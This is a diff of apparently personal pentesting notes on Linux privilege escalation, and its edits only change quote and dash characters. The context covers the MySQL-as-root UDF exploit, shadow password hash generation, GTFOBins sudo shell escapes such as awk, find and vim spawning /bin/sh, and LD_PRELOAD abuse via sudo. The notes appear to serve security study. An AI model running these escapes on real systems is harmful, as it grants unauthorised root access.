@@ -9,7 +9,7 @@ date:: 2021-10-30
 
 [Exploiting MySQL running as root via a malicious user-defined function dynamic library.](https://www.exploit-db.com/exploits/1518)
 
-The key to this is that if MySQL is running as root, then it can write files to all manner of directories. We use this to load a malicious library (raptor_udf2.so from the above ExploitDB link) as a plugin by first dumping it as a blob into a table and then dumping it back out in MySQL’s plugin directory. Once there, we define a UDF using the malicious plugin to allow us to execute system commands; in particular, this lets us set the sticky bit on a copied shell that we can then execute to obtain root.
+The key to this is that if MySQL is running as root, then it can write files to all manner of directories. We use this to load a malicious library (raptor_udf2.so from the above ExploitDB link) as a plugin by first dumping it as a blob into a table and then dumping it back out in MySQL's plugin directory. Once there, we define a UDF using the malicious plugin to allow us to execute system commands; in particular, this lets us set the sticky bit on a copied shell that we can then execute to obtain root.
 
 ```bash
 cd /home/user/tools/mysql-udf
@@ -34,24 +34,24 @@ Make a new password hash for /etc/password or /etc/shadow:
 mkpasswd -m sha-512 $PASSWORD
 ```
 
-[It’s also possible to generate MD5 passwords for /etc/passwd using the openssl binary.](../notes/local-file-inclusion-attacks.md)
+[It's also possible to generate MD5 passwords for /etc/passwd using the openssl binary.](../notes/local-file-inclusion-attacks.md)
 
 ### Sudo
 
 Some shell escapes via GTFOBins:
 
-* `awk` — `awk 'BEGIN {system("/bin/sh")}'`
-* `find` — `find . -exec /bin/sh \; -quit`
-* `ftp` — `!/bin/sh`
-* `iftop` — `!/bin/sh`
-* `less` — `!/bin/sh`
-* `man` — `!/bin/sh`
-* `more` — `!/bin/sh` (may require TERM to be unset)
-* `nano` — ^R^X followed by `reset; sh 1>&0 2>&0`
-* `nmap` — create a file containing `os.execute("/bin/sh")` and then run `nmap --script=$FILE`
-* `vim` — `:set shell=/bin/sh` followed by `:shell`
+* `awk` - `awk 'BEGIN {system("/bin/sh")}'`
+* `find` - `find . -exec /bin/sh \; -quit`
+* `ftp` - `!/bin/sh`
+* `iftop` - `!/bin/sh`
+* `less` - `!/bin/sh`
+* `man` - `!/bin/sh`
+* `more` - `!/bin/sh` (may require TERM to be unset)
+* `nano` - ^R^X followed by `reset; sh 1>&0 2>&0`
+* `nmap` - create a file containing `os.execute("/bin/sh")` and then run `nmap --script=$FILE`
+* `vim` - `:set shell=/bin/sh` followed by `:shell`
 
-If LD_PRELOAD or LD_LIBRARY_PATH are preserved by sudo, then it’s also possible to use a malicious dynamic library to gain root access. Preserved environment variables are listed by `sudo -l`.
+If LD_PRELOAD or LD_LIBRARY_PATH are preserved by sudo, then it's also possible to use a malicious dynamic library to gain root access. Preserved environment variables are listed by `sudo -l`.
 
 LD_PRELOAD is probably the easiest of these to exploit, because a library listed in this environment variable is just automatically loaded on application start. So just run `sudo LD_PRELOAD=/path/to/malicious.so program-runnable-with-nopasswd`.
 
